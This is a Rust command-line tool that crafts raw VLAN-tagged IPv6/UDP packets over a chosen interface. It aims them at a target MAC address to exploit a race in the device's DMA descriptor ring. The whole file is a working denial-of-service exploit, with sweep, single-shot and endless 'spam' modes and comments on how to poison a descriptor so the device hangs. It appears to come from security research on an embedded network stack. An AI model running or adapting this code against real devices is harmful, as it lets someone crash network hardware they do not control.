use anyhow::{anyhow, bail, Context, Result};
use clap::{Parser, Subcommand};
use log::{info, trace, warn};
use pnet::{
    datalink::{DataLinkReceiver, DataLinkSender},
    ipnetwork::IpNetwork,
    packet::{
        ethernet::{
            EtherType, EtherTypes, EthernetPacket, MutableEthernetPacket,
        },
        ip::{IpNextHeaderProtocol, IpNextHeaderProtocols},
        ipv6::{Ipv6Packet, MutableIpv6Packet},
        udp::{MutableUdpPacket, UdpPacket},
        vlan::MutableVlanPacket,
        Packet,
    },
    util::MacAddr,
};
use std::{
    net::Ipv6Addr,
    str::FromStr,
    time::{Duration, Instant},
};

////////////////////////////////////////////////////////////////////////////////

const SOURCE_PORT: u16 = 2000;
const DEST_PORT: u16 = 7777;

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Ethernet interface to use
    #[arg(short, long)]
    iface: String,

    /// MAC address to target
    #[arg(long)]
    mac: String,

    #[clap(subcommand)]
    cmd: Command,
}

#[derive(Debug, Subcommand)]
enum Command {
    /// Sweeps packet delay across a range
    Sweep {
        /// Time offset at which to begin the sweep, in microseconds
        #[arg(long, allow_hyphen_values(true), default_value_t = -2000)]
        start: i64,
        /// Time offset at which to end the sweep, in microseconds
        #[arg(long, allow_hyphen_values(true), default_value_t = 2000)]
        end: i64,
    },
    /// Send a single packet with a specific delay
    One {
        /// Time offset, in microseconds
        #[arg(long, allow_hyphen_values(true))]
        delay: i64,
    },
    /// Send a constant stream of packets with a specific delay
    Spam {
        /// Time offset, in microseconds
        #[arg(long, allow_hyphen_values(true))]
        delay: i64,
    },
}

fn main() -> Result<()> {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("info"),
    )
    .init();

    // Open a bogus socket to listen on port 2000, which prevents the OS from
    // replying with ICMPv6 messages about the port being unreachable.
    let _socket = std::net::UdpSocket::bind(format!("[::]:{SOURCE_PORT}"))?;

    let args = Args::parse();
    let dest_mac = MacAddr::from_str(&args.mac)
        .with_context(|| format!("failed to parse '{}'", args.mac))?;
    let dest_ip = mac_to_ipv6(dest_mac);
    info!("target MAC address:  {dest_mac:?}");
    info!("target IPv6 address: {dest_ip:?}");

    let interfaces = pnet::datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == args.iface)
        .ok_or_else(|| anyhow!("could not find interface '{}'", args.iface))?;
    let source_mac = interface.mac.unwrap();
    let source_ip = interface
        .ips
        .iter()
        .find_map(|i| match i {
            IpNetwork::V6(ip) => Some(ip.ip()),
            _ => None,
        })
        .ok_or_else(|| anyhow!("could not get IPv6 address from interface"))?;

    let cfg = pnet::datalink::Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };
    let (sender, receiver) = match pnet::datalink::channel(&interface, cfg)? {
        pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
        _ => bail!("Unknown channel type"),
    };

    let builder = Builder {
        source_ip,
        source_mac,
        dest_ip,
        dest_mac,
    };

    let mut worker = Worker {
        builder,
        sender,
        receiver,
    };

    // Send a friendly packet to ensure that we're in the target's NDP tables
    info!("sending initial packet to populate NDP tables");
    if !worker.check_alive() {
        bail!("could not send initial packet; is the target already locked up?")
    }
    info!("received reply from hello packet");

    match args.cmd {
        Command::Sweep { start, end } => {
            if end <= start {
                bail!("end must be greater than start");
            }
            let delay = worker.run_delay_sweep(start, end)?;
            println!("{delay}");
        }
        Command::One { delay } => {
            worker.run_one(delay)?;
        }
        Command::Spam { delay } => loop {
            worker.run_one(delay)?;
        },
    }

    Ok(())
}

struct Worker {
    builder: Builder,
    sender: Box<dyn DataLinkSender>,
    receiver: Box<dyn DataLinkReceiver>,
}

impl Worker {
    fn udp_packet(&self, data: &[u8]) -> impl Packet {
        let (udp, payload_len, tag) = self.builder.udp(data);
        let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
        self.builder.eth(ipv6, ethertype)
    }

    fn hello_packet(&self) -> impl Packet {
        self.udp_packet(&[0])
    }

    fn delay_packet(&self) -> impl Packet {
        self.udp_packet(&[b'1'])
    }

    /// Checks whether the target is still alive
    ///
    /// Returns `true` if it replies, `false` otherwise
    fn check_alive(&mut self) -> bool {
        self.sender.send_to(self.hello_packet().packet(), None);
        self.receive_udp(Duration::from_millis(100)).is_some()
    }

    fn run_delay_sweep(&mut self, start: i64, end: i64) -> Result<i64> {
        for n in 0.. {
            info!("beginning iteration {n}");
            for i in start..end {
                if let Err(e) = self.run_one(i) {
                    warn!("ignoring error {e}");
                    break;
                }
                if !self.check_alive() {
                    info!("killed with delay {i}");
                    return Ok(i);
                }
            }
        }
        unreachable!()
    }

    /// Tries to kill the target with a particular timing delay
    fn run_one(&mut self, delay_micros: i64) -> Result<()> {
        // Build our attack packets with a VLAN VID payload, triggering an invalid
        // DMA write address if we successfully attack the descriptor.
        let mut padding_packets = vec![];
        for i in 0..4 {
            // Build a padded packet which is long enough to be discarded by the
            // target, to keep things simple.
            let mut data: Vec<u8> = format!("data-{i}-").as_bytes().to_vec();
            for i in 0..16 {
                data.push(b'1' + i % 10);
            }
            let (udp, payload_len, tag) = self.builder.udp(&data);
            let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
            let (vlan, ethertype) = self.builder.vlan(0x301, ipv6, ethertype);
            let eth = self.builder.eth(vlan, ethertype);
            padding_packets.push(eth);
        }

        // Send our attack sequence
        trace!("sending attack sequence with delay {delay_micros}");
        let send_start = Instant::now();

        // This triggers a 250 ms busywait
        self.sender.send_to(self.delay_packet().packet(), None);

        // Brief pause to make sure that the busy-wait happened
        std::thread::sleep(Duration::from_millis(10));

        // Send three padding packets.  At this point, the descriptor ring should
        // look like the following:
        //
        // -0------1------2------------
        // | user | user | user | dma |
        // ----------------------------
        // ^ user position      ^ dma position (in "waiting for packet" state)
        for p in &padding_packets {
            self.sender.send_to(p.packet(), None);
        }

        // Sleep until the busy-wait ends
        let mut sleep_amount =
            Duration::from_millis(20) - (Instant::now() - send_start);
        if delay_micros > 0 {
            sleep_amount += Duration::from_micros(delay_micros as u64);
        } else {
            sleep_amount -= Duration::from_micros(-delay_micros as u64);
        }
        std::thread::sleep(sleep_amount);

        // Remember, at this point, our descriptor ring looks like the
        // following:
        //
        // -0------1------2------3-----
        // | user | user | user | user |
        // ----------------------------
        // ^ user position
        // ^ dma position (in "suspended" state)
        //
        // When user code exits the busy-wait, it will begin processing packet 0
        // and then poke the tail pointer to restart the peripheral.
        //
        // -0------1------2------3-----
        // | dma  | user | user | user |
        // ----------------------------
        //        ^ user position
        // ^ dma position (in "waiting for packet" state)
        //
        // We want the DMA peripheral to finish storing the incoming packet into
        // slot 0 at the exact same time as the user code releases descriptor 1
        // in the ring.  This means that we have a window where the DMA
        // peripheral can read descriptor 0 in the ring at the same time as user
        // code writes it, triggering our bug.
        //
        // If the packet arrives too early, it will get written to descriptor 0
        // and when processing the second user packet, we'll notice that the DMA
        // peripheral is off:
        //
        //  -0------1------2------3------
        //  | user | user | user | user |  DMA writes new packet to slot 0
        //  -----------------------------
        //         ^ user position
        //         ^ dma position (off)
        //
        //  -0------1------2------3------
        //  | user | dma  | user | user |  User code processes slot 0
        //  -----------------------------
        //         ^ user position
        //         ^ dma position (waiting for packet)
        //
        // This will be indicated by a Suspended value in the DMA peripheral
        //
        // If the packet arrives way too late, when processing the first user
        // packet, DMA will still be waiting:
        //
        //  -0------1------2------3------
        //  | user | dma  | user | user |  user code processes packet in slot 1
        //  -----------------------------
        //                ^ user position
        //  ^ dma position ("waiting for packet")
        //
        //  -0------1------2------3------
        //  | user | dma  | user | user | DMA writes new packet to slot 0
        //  -----------------------------
        //                ^ user position
        //         ^ dma position ("waiting for packet")
        //
        // This means that we can tell our critical timing by examining when we
        // start seeing "suspended" readings in our 6-packet burst.
        self.sender.send_to(padding_packets[0].packet(), None);

        // If we successfully poisoned the descriptor, then the DMA peripheral is
        // waiting to write to address 0x301, which is invalid.  Any further
        // communication will fail.

        // Receive the initial reply
        if let Some((reply, _reply_time)) =
            self.receive_udp(Duration::from_millis(10))
        {
            assert_eq!(reply, vec![b'1']);
        } else {
            bail!("failed to receive initial reply");
        }
        Ok(())
    }

    /// Receives a single UDP packet
    ///
    /// Returns the packet data and arrival time on success, or `None` on timeout
    fn receive_udp(&mut self, timeout: Duration) -> Option<(Vec<u8>, Instant)> {
        let start = Instant::now();
        while Instant::now() - start < timeout {
            let Ok(rx) = self.receiver.next() else {
            continue;
        };
            let rx_time = Instant::now();
            let packet = EthernetPacket::new(rx).unwrap();
            if EtherTypes::Ipv6 == packet.get_ethertype() {
                let header = Ipv6Packet::new(packet.payload()).unwrap();
                if IpNextHeaderProtocols::Udp == header.get_next_header() {
                    let udp = UdpPacket::new(header.payload()).unwrap();
                    if udp.get_destination() == SOURCE_PORT {
                        return Some((udp.payload().to_owned(), rx_time));
                    }
                }
            }
        }
        None
    }
}

/// Convert a MAC address to a link-local IPv6 address
fn mac_to_ipv6(mut mac: MacAddr) -> Ipv6Addr {
    mac.0 ^= 2;
    Ipv6Addr::new(
        0xfe80,
        0,
        0,
        0,
        u16::from_be_bytes([mac.0, mac.1]),
        u16::from_be_bytes([mac.2, 0xff]),
        u16::from_be_bytes([0xfe, mac.3]),
        u16::from_be_bytes([mac.4, mac.5]),
    )
}

/// Helper class to build relevant packets without too much boilerplate
struct Builder {
    source_ip: Ipv6Addr,
    dest_ip: Ipv6Addr,
    source_mac: MacAddr,
    dest_mac: MacAddr,
}

impl Builder {
    fn udp(&self, data: &[u8]) -> (impl Packet, u16, IpNextHeaderProtocol) {
        let payload_len: u16 =
            (data.len() + 8).try_into().expect("packet size overflow");

        // Build from the bottom up, so that each buffer is exactly the right size
        let mut udp =
            MutableUdpPacket::owned(vec![0u8; payload_len as usize]).unwrap();
        udp.set_source(SOURCE_PORT);
        udp.set_destination(DEST_PORT); // our target port
        udp.set_payload(data);
        udp.set_length(payload_len); // UDP header length
        let udp_chk = pnet::packet::udp::ipv6_checksum(
            &udp.to_immutable(),
            &self.source_ip,
            &self.dest_ip,
        );
        udp.set_checksum(udp_chk);
        (udp, payload_len, IpNextHeaderProtocols::Udp)
    }

    fn ipv6<P: Packet>(
        &self,
        data: P,
        payload_len: u16,
        next_header: IpNextHeaderProtocol,
    ) -> (impl Packet, EtherType) {
        let mut ipv6 = MutableIpv6Packet::owned(vec![
            0u8;
            Ipv6Packet::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        ipv6.set_version(6);
        ipv6.set_hop_limit(64);
        ipv6.set_next_header(next_header);
        ipv6.set_destination(self.dest_ip);
        ipv6.set_source(self.source_ip);
        ipv6.set_payload_length(payload_len);
        ipv6.set_payload(data.packet());

        (ipv6, EtherTypes::Ipv6)
    }

    fn vlan<P: Packet>(
        &self,
        vid: u16,
        data: P,
        tag: EtherType,
    ) -> (impl Packet, EtherType) {
        let mut vlan = MutableVlanPacket::owned(vec![
            0u8;
            MutableVlanPacket::minimum_packet_size()
                + data.packet().len()
        ])
        .unwrap();

        vlan.set_ethertype(tag);
        vlan.set_vlan_identifier(vid);
        vlan.set_payload(data.packet());
        (vlan, EtherTypes::Vlan)
    }

    fn eth<P: Packet>(&self, data: P, tag: EtherType) -> impl Packet {
        let mut eth =
            MutableEthernetPacket::owned(vec![
                0u8;
                EthernetPacket::minimum_packet_size()
                    + data.packet().len()
            ])
            .unwrap();
        eth.set_destination(self.dest_mac);
        eth.set_source(self.source_mac);
        eth.set_ethertype(tag);
        eth.set_payload(data.packet());
        eth
    }
}
